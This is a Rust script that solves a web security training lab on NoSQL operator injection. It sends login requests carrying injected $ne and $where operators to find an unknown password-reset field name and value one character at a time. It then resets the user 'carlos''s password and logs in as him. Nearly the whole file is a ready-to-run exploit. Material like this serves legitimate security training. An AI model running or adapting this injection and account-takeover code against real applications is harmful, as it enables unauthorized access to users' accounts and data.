/**********************************************************************************
*
* Lab: Exploiting NoSQL operator injection to extract unknown fields
*
* Hack Steps: 
*      1. Fetch the forgot-password page
*      2. Extract the csrf token and session cookie
*      3. Make a forgot-password request for carlos
*      4. Inject an operator and payload into the login JSON object to determine
*         the length of the unknown field name
*      5. Modify the payload to brute force the field name
*      6. Modify the payload to determine the length of the field value
*      7. Modify the payload to brute force the field value
*      8. Fetch the forgot-password page with the field name and its value
*         as a query pararmeter
*      9. Extract the csrf token and session cookie
*      10. Make a reset password request for carlos
*      11. Login as carlos with the new password
*      12. Fetch the carlos profile
*
***********************************************************************************/
#![allow(unused_assignments)]
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    process,
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a59009d0363f09f81f8359400cf002c.web-security-academy.net";
const NEW_PASSWORD: &str = "Hacked"; // You can change this to what you want
const FIELD_NUM: i32 = 4; // The field number we want to extract, you may need to change this to 3 depending on the lab setup

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    println!(
        "{} {}",
        "⦗#⦘ Injection point:".blue(),
        "login JSON object".yellow()
    );
    print!("⦗1⦘ Fetching the forgot-password page.. ");
    flush_terminal();

    let mut forgot_password_page = fetch("/forgot-password");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the csrf token and session cookie.. ");
    flush_terminal();

    let mut session = get_session_cookie(&forgot_password_page);
    let mut csrf_token = get_csrf_token(forgot_password_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Sending a reset password request for carlos.. ");
    flush_terminal();

    make_forgot_password_request_for_carlos(&session, &csrf_token);

    println!("{}", "OK".green());
    println!("⦗4⦘ Determining the length of the 3rd field.. ");

    let field_name_length = determine_length("");

    println!("⦗5⦘ Brute force the field name.. ");

    let field_name = brute_force("", field_name_length);

    println!("\n⦗6⦘ Determining the length of the 3rd field value.. ");

    let field_value_length = determine_length(&field_name);

    println!("⦗7⦘ Brute force the field value.. ");

    let field_value = brute_force(&field_name, field_value_length);

    print!(
        "\n⦗8⦘ Fetching the forgot-password page with the field name and its value as a query pararmter.. "
    );
    flush_terminal();

    forgot_password_page = fetch(&format!("/forgot-password?{field_name}={field_value}"));

    println!("{}", "OK".green());
    print!("⦗9⦘ Extracting the csrf token and session cookie.. ");
    flush_terminal();

    session = get_session_cookie(&forgot_password_page);
    csrf_token = get_csrf_token(forgot_password_page);

    println!("{}", "OK".green());
    print!("⦗10⦘ Reseting carlos password to {}..", NEW_PASSWORD.blue());
    flush_terminal();

    reset_carlos_password(&session, &csrf_token, &field_name, &field_value);

    println!("{}", "OK".green());
    print!("⦗11⦘ Logging in as the carlos.. ");
    flush_terminal();

    let json = format!(r###"{{ "username": "carlos", "password": "{NEW_PASSWORD}" }}"###);
    let login_as_carlos = post_json("/login", json);

    println!("{}", "OK".green());
    print!("⦗12⦘ Fetching the carlos profile.. ");
    flush_terminal();

    session = get_session_cookie(&login_as_carlos);
    fetch_with_session("/my-account", &session);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn make_forgot_password_request_for_carlos(session: &str, csrf_token: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/forgot-password"))
        .form(&HashMap::from([
            ("username", "carlos"),
            ("csrf", csrf_token),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to make the forgot-password request for carlos".red()
        ));
}

fn post_json(path: &str, json: String) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}{path}"))
        .header("Content-Type", "application/json")
        .body(json)
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as carlos".red()))
}

fn determine_length(field_name: &str) -> usize {
    let mut payload = String::new();

    for length in 1..50 {
        print!("\r❯❯ Checking if length = {}", length.to_string().yellow());
        flush_terminal();

        match field_name {
            //  determine the length of the field name
            "" => {
                payload = format!(
                    r###"{{ "username": "carlos", "password": {{ "$ne": "" }}, "$where": "Object.keys(this)[{FIELD_NUM}].length == {length}" }}"###
                );
            }
            // determine the length of the field value
            _ => {
                payload = format!(
                    r###"{{ "username": "carlos", "password": {{ "$ne": "" }}, "$where": "this.{field_name}.length == {length}" }}"###
                );
            }
        }
        let injection = post_json("/login", payload);
        let body = injection.text().unwrap();
        if text_is_not_exist_in_body("Invalid username or password", &body) {
            println!(" [ {} {} ]", "Correct length:", length.to_string().green());
            return length;
        } else {
            continue;
        }
    }

    println!("{}", "⦗!⦘ Failed to determine the length".red());
    process::exit(1);
}

fn brute_force(field_name: &str, length: usize) -> String {
    let mut correct_value = String::new();
    let mut payload = String::new();

    for position in 0..length {
        for character in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".chars() {
            print!(
                "\r❯❯ Checking if char at position {} = {}",
                position.to_string().blue(),
                character.to_string().yellow()
            );
            flush_terminal();

            match field_name {
                //  brute force the field name
                "" => {
                    payload = format!(
                        r###" {{ "username": "carlos", "password": {{ "$ne": "" }}, "$where": "Object.keys(this)[{FIELD_NUM}][{position}] == '{character}'" }} "###
                    );
                }
                //  brute force the field value
                _ => {
                    payload = format!(
                        r###" {{ "username": "carlos", "password": {{ "$ne": "" }}, "$where": "this.{field_name}[{position}] == '{character}'" }} "###
                    );
                }
            }
            let injection = post_json("/login", payload);
            let body = injection.text().unwrap();
            if text_is_not_exist_in_body("Invalid username or password", &body) {
                correct_value.push(character);
                print!(" [ {} {} ]", "Correct:", correct_value.green());
                break;
            } else {
                continue;
            }
        }
    }

    return correct_value;
}

fn text_is_not_exist_in_body(pattern: &str, text: &str) -> bool {
    let regex = Regex::new(pattern).unwrap();
    let is_exist = regex.find(text);
    if is_exist.is_none() {
        true
    } else {
        false
    }
}

fn reset_carlos_password(session: &str, csrf_token: &str, field_name: &str, field_value: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/forgot-password"))
        .form(&HashMap::from([
            ("csrf", csrf_token),
            (&field_name, field_value),
            ("new-password-1", NEW_PASSWORD),
            ("new-password-2", NEW_PASSWORD),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to reset carlos password".red()));
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
